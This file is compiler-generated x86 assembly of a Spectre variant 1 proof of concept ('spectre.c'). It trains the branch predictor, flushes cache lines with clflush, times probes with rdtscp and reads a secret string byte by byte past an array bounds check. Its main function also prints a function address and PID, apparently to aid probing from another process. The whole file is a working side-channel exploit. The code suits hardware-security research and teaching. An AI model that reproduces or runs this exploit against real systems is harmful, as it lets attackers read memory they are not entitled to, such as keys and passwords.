	.file	"spectre.c"
	.intel_syntax noprefix
	.text
	.p2align 4
	.globl	check
	.type	check, @function
check:
.LFB5562:
	.cfi_startproc
	call	__x86.get_pc_thunk.ax
	add	eax, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_
	mov	eax, DWORD PTR array1_size@GOTOFF[eax]
	cmp	eax, DWORD PTR 4[esp]
	seta	al
	movzx	eax, al
	ret
	.cfi_endproc
.LFE5562:
	.size	check, .-check
	.p2align 4
	.globl	leakByteLocalFunction
	.type	leakByteLocalFunction, @function
leakByteLocalFunction:
.LFB5563:
	.cfi_startproc
	call	__x86.get_pc_thunk.ax
	add	eax, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_
	mov	edx, DWORD PTR 4[esp]
	movzx	edx, BYTE PTR array2@GOTOFF[eax+edx]
	and	BYTE PTR temp@GOTOFF[eax], dl
	ret
	.cfi_endproc
.LFE5563:
	.size	leakByteLocalFunction, .-leakByteLocalFunction
	.p2align 4
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB5564:
	.cfi_startproc
	call	__x86.get_pc_thunk.ax
	add	eax, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_
	mov	edx, DWORD PTR 4[esp]
	mov	ecx, DWORD PTR array1_size@GOTOFF[eax]
	cmp	ecx, edx
	jbe	.L4
	movzx	edx, BYTE PTR array1@GOTOFF[eax+edx]
	sal	edx, 9
	movzx	edx, BYTE PTR array2@GOTOFF[eax+edx]
	and	BYTE PTR temp@GOTOFF[eax], dl
.L4:
	ret
	.cfi_endproc
.LFE5564:
	.size	victim_function, .-victim_function
	.p2align 4
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB5565:
	.cfi_startproc
	push	ebp
	.cfi_def_cfa_offset 8
	.cfi_offset 5, -8
	mov	ecx, 256
	push	edi
	.cfi_def_cfa_offset 12
	.cfi_offset 7, -12
	push	esi
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	call	__x86.get_pc_thunk.si
	add	esi, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_
	push	ebx
	.cfi_def_cfa_offset 20
	.cfi_offset 3, -20
	sub	esp, 92
	.cfi_def_cfa_offset 112
	mov	eax, DWORD PTR 116[esp]
	mov	DWORD PTR 56[esp], eax
	mov	eax, DWORD PTR 120[esp]
	lea	edi, results.0@GOTOFF[esi]
	mov	DWORD PTR 20[esp], esi
	mov	DWORD PTR 60[esp], eax
	mov	eax, DWORD PTR gs:20
	mov	DWORD PTR 76[esp], eax
	xor	eax, eax
	mov	DWORD PTR 40[esp], edi
	mov	DWORD PTR 68[esp], 0
	mov	DWORD PTR 32[esp], 999
	rep stosd
	lea	eax, array1_size@GOTOFF[esi]
	mov	DWORD PTR 48[esp], eax
	lea	eax, 68[esp]
	mov	DWORD PTR 28[esp], eax
	lea	eax, array2@GOTOFF[esi]
	mov	DWORD PTR 24[esp], eax
	lea	eax, results.0@GOTOFF
	mov	DWORD PTR 52[esp], eax
	lea	eax, array1@GOTOFF[esi]
	mov	DWORD PTR 36[esp], eax
.L7:
	mov	edi, DWORD PTR 24[esp]
	mov	eax, edi
	lea	edx, 131072[edi]
	.p2align 4,,10
	.p2align 3
.L8:
	clflush	[eax]
	add	eax, 512
	cmp	eax, edx
	jne	.L8
	mov	eax, DWORD PTR 20[esp]
	mov	ebx, DWORD PTR 112[esp]
	mov	edi, -1431655765
	mov	ebp, DWORD PTR 48[esp]
	mov	esi, DWORD PTR array1_size@GOTOFF[eax]
	mov	eax, DWORD PTR 32[esp]
	cdq
	idiv	esi
	mov	eax, 29
	xor	ebx, edx
	mov	esi, edx
	mov	DWORD PTR 16[esp], ebx
	mov	ebx, eax
	.p2align 4,,10
	.p2align 3
.L10:
	clflush	0[ebp]
	mov	DWORD PTR 72[esp], 0
	mov	eax, DWORD PTR 72[esp]
	cmp	eax, 99
	jg	.L12
	.p2align 4,,10
	.p2align 3
.L9:
	mov	eax, DWORD PTR 72[esp]
	add	eax, 1
	mov	DWORD PTR 72[esp], eax
	mov	eax, DWORD PTR 72[esp]
	cmp	eax, 99
	jle	.L9
.L12:
	mov	eax, ebx
	mul	edi
	mov	eax, ebx
	sub	ebx, 1
	shr	edx, 2
	lea	edx, [edx+edx*2]
	add	edx, edx
	sub	eax, edx
	sub	eax, 1
	mov	edx, eax
	shr	eax, 16
	xor	dx, dx
	or	eax, edx
	and	eax, DWORD PTR 16[esp]
	xor	eax, esi
	push	eax
	.cfi_def_cfa_offset 116
	call	victim_function
	pop	eax
	.cfi_def_cfa_offset 112
	cmp	ebx, -1
	jne	.L10
	mov	DWORD PTR 44[esp], ebx
	mov	ebp, 13
	.p2align 4,,10
	.p2align 3
.L11:
	mov	eax, ebp
	movzx	ebx, al
	mov	eax, ebx
	sal	eax, 9
	mov	DWORD PTR 16[esp], eax
	rdtscp
	mov	edi, DWORD PTR 28[esp]
	mov	DWORD PTR 8[esp], eax
	mov	DWORD PTR 12[esp], edx
	mov	DWORD PTR [edi], ecx
	mov	esi, DWORD PTR 24[esp]
	mov	eax, DWORD PTR 16[esp]
	movzx	eax, BYTE PTR [esi+eax]
	rdtscp
	mov	DWORD PTR [edi], ecx
	sub	eax, DWORD PTR 8[esp]
	mov	ecx, 100
	mov	esi, eax
	sbb	edx, DWORD PTR 12[esp]
	xor	eax, eax
	cmp	ecx, esi
	sbb	eax, edx
	jc	.L13
	mov	eax, DWORD PTR 20[esp]
	mov	ecx, DWORD PTR array1_size@GOTOFF[eax]
	mov	eax, DWORD PTR 32[esp]
	cdq
	idiv	ecx
	mov	eax, DWORD PTR 36[esp]
	movzx	eax, BYTE PTR [eax+edx]
	cmp	eax, ebx
	je	.L13
	mov	eax, DWORD PTR 40[esp]
	add	DWORD PTR [eax+ebx*4], 1
.L13:
	add	ebp, 167
	cmp	ebp, 42765
	jne	.L11
	mov	eax, DWORD PTR 52[esp]
	mov	edi, DWORD PTR 20[esp]
	xor	ecx, ecx
	mov	ebp, DWORD PTR 40[esp]
	mov	esi, DWORD PTR [eax+edi]
	mov	edi, DWORD PTR 44[esp]
	mov	eax, 1
	mov	edx, esi
	jmp	.L15
	.p2align 4,,10
	.p2align 3
.L38:
	cmp	edi, -1
	je	.L20
	cmp	ebx, DWORD PTR 0[ebp+edi*4]
	cmovge	edi, eax
.L14:
	add	eax, 1
	mov	edx, DWORD PTR 0[ebp+ecx*4]
	cmp	eax, 256
	je	.L37
.L15:
	mov	ebx, DWORD PTR 20[esp]
	mov	ebx, DWORD PTR results.0@GOTOFF[ebx+eax*4]
	cmp	ebx, edx
	jl	.L38
	mov	edi, ecx
	mov	ecx, eax
	add	eax, 1
	mov	edx, DWORD PTR 0[ebp+ecx*4]
	cmp	eax, 256
	jne	.L15
.L37:
	mov	eax, DWORD PTR 40[esp]
	mov	DWORD PTR 44[esp], edi
	mov	eax, DWORD PTR [eax+edi*4]
	lea	ebx, 4[eax+eax]
	cmp	ebx, edx
	jl	.L16
	cmp	edx, 2
	jne	.L22
	test	eax, eax
	je	.L16
.L22:
	sub	DWORD PTR 32[esp], 1
	jne	.L7
.L16:
	mov	eax, DWORD PTR 20[esp]
	xor	esi, DWORD PTR 68[esp]
	mov	edi, DWORD PTR 56[esp]
	mov	ebx, DWORD PTR 60[esp]
	mov	DWORD PTR results.0@GOTOFF[eax], esi
	mov	esi, DWORD PTR 40[esp]
	mov	BYTE PTR [edi], cl
	mov	edx, DWORD PTR 44[esp]
	mov	eax, DWORD PTR [esi+ecx*4]
	mov	DWORD PTR [ebx], eax
	mov	BYTE PTR 1[edi], dl
	mov	eax, DWORD PTR [esi+edx*4]
	mov	DWORD PTR 4[ebx], eax
	mov	eax, DWORD PTR 76[esp]
	sub	eax, DWORD PTR gs:20
	jne	.L39
	add	esp, 92
	.cfi_remember_state
	.cfi_def_cfa_offset 20
	pop	ebx
	.cfi_restore 3
	.cfi_def_cfa_offset 16
	pop	esi
	.cfi_restore 6
	.cfi_def_cfa_offset 12
	pop	edi
	.cfi_restore 7
	.cfi_def_cfa_offset 8
	pop	ebp
	.cfi_restore 5
	.cfi_def_cfa_offset 4
	ret
	.p2align 4,,10
	.p2align 3
.L20:
	.cfi_restore_state
	mov	edi, eax
	jmp	.L14
.L39:
	call	__stack_chk_fail_local
	.cfi_endproc
.LFE5565:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC0:
	.string	"Success"
.LC1:
	.string	"Unclear"
	.section	.rodata.str1.4,"aMS",@progbits,1
	.align 4
.LC2:
	.string	"Putting '%s' in memory, address %p\n"
	.section	.rodata.str1.1
.LC3:
	.string	"%p"
.LC4:
	.string	"%d"
	.section	.rodata.str1.4
	.align 4
.LC5:
	.string	"Trying malicious_x = %p, len = %d\n"
	.section	.rodata.str1.1
.LC6:
	.string	"Reading %d bytes:\n"
	.section	.rodata.str1.4
	.align 4
.LC7:
	.string	"Reading at malicious_x = %p... "
	.section	.rodata.str1.1
.LC8:
	.string	"%s: "
.LC9:
	.string	"0x%02X='%c' score=%d "
	.section	.rodata.str1.4
	.align 4
.LC10:
	.string	"(second best: 0x%02X='%c' score=%d)"
	.section	.rodata.str1.1
.LC11:
	.string	"\n"
.LC12:
	.string	"addr = %llx, pid = %d\n"
	.section	.text.startup,"ax",@progbits
	.p2align 4
	.globl	main
	.type	main, @function
main:
.LFB5566:
	.cfi_startproc
	lea	ecx, 4[esp]
	.cfi_def_cfa 1, 0
	and	esp, -16
	push	DWORD PTR -4[ecx]
	push	ebp
	mov	ebp, esp
	.cfi_escape 0x10,0x5,0x2,0x75,0
	push	edi
	.cfi_escape 0x10,0x7,0x2,0x75,0x7c
	call	__x86.get_pc_thunk.di
	add	edi, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_
	push	esi
	push	ebx
	push	ecx
	.cfi_escape 0xf,0x3,0x75,0x70,0x6
	.cfi_escape 0x10,0x6,0x2,0x75,0x78
	.cfi_escape 0x10,0x3,0x2,0x75,0x74
	sub	esp, 104
	mov	eax, DWORD PTR [ecx]
	mov	DWORD PTR -104[ebp], eax
	mov	eax, DWORD PTR 4[ecx]
	mov	DWORD PTR -116[ebp], eax
	mov	eax, DWORD PTR gs:20
	mov	DWORD PTR -28[ebp], eax
	mov	eax, DWORD PTR stdin@GOT[edi]
	mov	DWORD PTR -68[ebp], eax
	lea	eax, check@GOTOFF[edi]
	mov	DWORD PTR -112[ebp], eax
	sar	eax, 31
	mov	DWORD PTR -108[ebp], eax
	.p2align 4,,10
	.p2align 3
.L41:
	mov	eax, DWORD PTR -68[ebp]
	sub	esp, 12
	mov	ebx, edi
	push	DWORD PTR [eax]
	call	getc@PLT
	add	esp, 16
	cmp	al, 114
	je	.L59
	cmp	al, 10
	je	.L41
	cmp	al, 105
	jne	.L51
	call	getpid@PLT
	sub	esp, 12
	mov	edx, DWORD PTR -108[ebp]
	push	eax
	mov	eax, DWORD PTR -112[ebp]
	add	eax, 33
	adc	edx, 0
	push	edx
	push	eax
	lea	eax, .LC12@GOTOFF[edi]
	push	eax
	push	1
	call	__printf_chk@PLT
	add	esp, 32
	jmp	.L41
.L59:
	mov	eax, DWORD PTR secret@GOTOFF[edi]
	lea	esi, array1@GOTOFF[edi]
	push	eax
	push	eax
	lea	eax, .LC2@GOTOFF[edi]
	push	eax
	push	1
	call	__printf_chk@PLT
	mov	eax, DWORD PTR secret@GOTOFF[edi]
	mov	edx, eax
	mov	DWORD PTR [esp], eax
	sub	edx, esi
	mov	DWORD PTR -48[ebp], edx
	call	strlen@PLT
	add	esp, 12
	mov	DWORD PTR -44[ebp], eax
	mov	DWORD PTR -60[ebp], eax
	lea	eax, array2@GOTOFF[edi]
	push	131072
	push	1
	push	eax
	call	memset@PLT
	add	esp, 16
	cmp	DWORD PTR -104[ebp], 3
	mov	edx, DWORD PTR -60[ebp]
	je	.L60
.L43:
	sub	esp, 4
	lea	eax, .LC6@GOTOFF[edi]
	mov	ebx, edi
	push	edx
	push	eax
	push	1
	call	__printf_chk@PLT
	mov	eax, DWORD PTR -44[ebp]
	add	esp, 16
	sub	eax, 1
	mov	DWORD PTR -44[ebp], eax
	test	eax, eax
	js	.L41
	lea	eax, .LC7@GOTOFF[edi]
	mov	DWORD PTR -84[ebp], eax
	lea	eax, -40[ebp]
	mov	DWORD PTR -72[ebp], eax
	lea	eax, -30[ebp]
	mov	DWORD PTR -80[ebp], eax
	lea	eax, .LC8@GOTOFF[edi]
	mov	DWORD PTR -88[ebp], eax
	lea	eax, .LC9@GOTOFF[edi]
	mov	DWORD PTR -92[ebp], eax
	lea	eax, .LC11@GOTOFF[edi]
	mov	DWORD PTR -76[ebp], eax
	lea	eax, .LC1@GOTOFF[edi]
	mov	DWORD PTR -100[ebp], eax
	lea	eax, .LC0@GOTOFF[edi]
	mov	DWORD PTR -96[ebp], eax
	.p2align 4,,10
	.p2align 3
.L44:
	sub	esp, 4
	push	DWORD PTR -48[ebp]
	mov	ebx, edi
	mov	esi, 63
	push	DWORD PTR -84[ebp]
	push	1
	call	__printf_chk@PLT
	mov	eax, DWORD PTR -48[ebp]
	add	esp, 12
	push	DWORD PTR -72[ebp]
	push	DWORD PTR -80[ebp]
	push	eax
	lea	edx, 1[eax]
	mov	DWORD PTR -48[ebp], edx
	call	readMemoryByte
	mov	edx, DWORD PTR -36[ebp]
	mov	ecx, DWORD PTR -40[ebp]
	add	esp, 12
	lea	eax, [edx+edx]
	mov	DWORD PTR -64[ebp], edx
	cmp	ecx, eax
	mov	eax, DWORD PTR -100[ebp]
	cmovge	eax, DWORD PTR -96[ebp]
	mov	DWORD PTR -60[ebp], ecx
	push	eax
	push	DWORD PTR -88[ebp]
	push	1
	call	__printf_chk@PLT
	movzx	ebx, BYTE PTR -30[ebp]
	mov	ecx, DWORD PTR -60[ebp]
	mov	eax, ebx
	mov	DWORD PTR [esp], ecx
	sub	eax, 32
	cmp	al, 95
	mov	eax, esi
	cmovb	eax, ebx
	push	eax
	push	ebx
	mov	ebx, edi
	push	DWORD PTR -92[ebp]
	push	1
	call	__printf_chk@PLT
	mov	edx, DWORD PTR -64[ebp]
	add	esp, 32
	test	edx, edx
	jle	.L48
	movzx	eax, BYTE PTR -29[ebp]
	mov	ecx, eax
	sub	ecx, 32
	cmp	cl, 95
	cmovb	esi, eax
	sub	esp, 12
	push	edx
	push	esi
	push	eax
	lea	eax, .LC10@GOTOFF[edi]
	push	eax
	push	1
	call	__printf_chk@PLT
	add	esp, 32
.L48:
	sub	esp, 8
	push	DWORD PTR -76[ebp]
	mov	ebx, edi
	push	1
	call	__printf_chk@PLT
	mov	eax, DWORD PTR -44[ebp]
	add	esp, 16
	sub	eax, 1
	mov	DWORD PTR -44[ebp], eax
	test	eax, eax
	jns	.L44
	jmp	.L41
.L51:
	mov	eax, DWORD PTR -28[ebp]
	sub	eax, DWORD PTR gs:20
	jne	.L61
	lea	esp, -16[ebp]
	xor	eax, eax
	pop	ecx
	.cfi_remember_state
	.cfi_restore 1
	.cfi_def_cfa 1, 0
	pop	ebx
	.cfi_restore 3
	pop	esi
	.cfi_restore 6
	pop	edi
	.cfi_restore 7
	pop	ebp
	.cfi_restore 5
	lea	esp, -4[ecx]
	.cfi_def_cfa 4, 4
	ret
.L60:
	.cfi_restore_state
	push	eax
	lea	eax, -48[ebp]
	push	eax
	lea	eax, .LC3@GOTOFF[edi]
	push	eax
	mov	eax, DWORD PTR -116[ebp]
	push	DWORD PTR 4[eax]
	call	__isoc99_sscanf@PLT
	add	esp, 12
	lea	eax, -44[ebp]
	sub	DWORD PTR -48[ebp], esi
	push	eax
	lea	eax, .LC4@GOTOFF[edi]
	push	eax
	mov	eax, DWORD PTR -116[ebp]
	push	DWORD PTR 8[eax]
	call	__isoc99_sscanf@PLT
	lea	eax, .LC5@GOTOFF[edi]
	push	DWORD PTR -44[ebp]
	push	DWORD PTR -48[ebp]
	push	eax
	push	1
	call	__printf_chk@PLT
	mov	edx, DWORD PTR -44[ebp]
	add	esp, 32
	jmp	.L43
.L61:
	call	__stack_chk_fail_local
	.cfi_endproc
.LFE5566:
	.size	main, .-main
	.local	results.0
	.comm	results.0,1024,32
	.globl	temp1
	.bss
	.align 4
	.type	temp1, @object
	.size	temp1, 4
temp1:
	.zero	4
	.globl	temp
	.type	temp, @object
	.size	temp, 1
temp:
	.zero	1
	.globl	secret
	.section	.rodata.str1.4
	.align 4
.LC13:
	.string	"The Magic Words are Squeamish Ossifrage."
	.section	.data.rel.local,"aw"
	.align 4
	.type	secret, @object
	.size	secret, 4
secret:
	.long	.LC13
	.globl	array2
	.data
	.align 32
	.type	array2, @object
	.size	array2, 131072
array2:
	.string	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	131055
	.globl	unused2
	.bss
	.align 32
	.type	unused2, @object
	.size	unused2, 64
unused2:
	.zero	64
	.globl	array1
	.data
	.align 32
	.type	array1, @object
	.size	array1, 160
array1:
	.string	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	143
	.globl	unused1
	.bss
	.align 32
	.type	unused1, @object
	.size	unused1, 64
unused1:
	.zero	64
	.globl	array1_size
	.data
	.align 4
	.type	array1_size, @object
	.size	array1_size, 4
array1_size:
	.long	16
	.section	.text.__x86.get_pc_thunk.ax,"axG",@progbits,__x86.get_pc_thunk.ax,comdat
	.globl	__x86.get_pc_thunk.ax
	.hidden	__x86.get_pc_thunk.ax
	.type	__x86.get_pc_thunk.ax, @function
__x86.get_pc_thunk.ax:
.LFB5567:
	.cfi_startproc
	mov	eax, DWORD PTR [esp]
	ret
	.cfi_endproc
.LFE5567:
	.section	.text.__x86.get_pc_thunk.si,"axG",@progbits,__x86.get_pc_thunk.si,comdat
	.globl	__x86.get_pc_thunk.si
	.hidden	__x86.get_pc_thunk.si
	.type	__x86.get_pc_thunk.si, @function
__x86.get_pc_thunk.si:
.LFB5568:
	.cfi_startproc
	mov	esi, DWORD PTR [esp]
	ret
	.cfi_endproc
.LFE5568:
	.section	.text.__x86.get_pc_thunk.di,"axG",@progbits,__x86.get_pc_thunk.di,comdat
	.globl	__x86.get_pc_thunk.di
	.hidden	__x86.get_pc_thunk.di
	.type	__x86.get_pc_thunk.di, @function
__x86.get_pc_thunk.di:
.LFB5569:
	.cfi_startproc
	mov	edi, DWORD PTR [esp]
	ret
	.cfi_endproc
.LFE5569:
	.hidden	__stack_chk_fail_local
	.ident	"GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
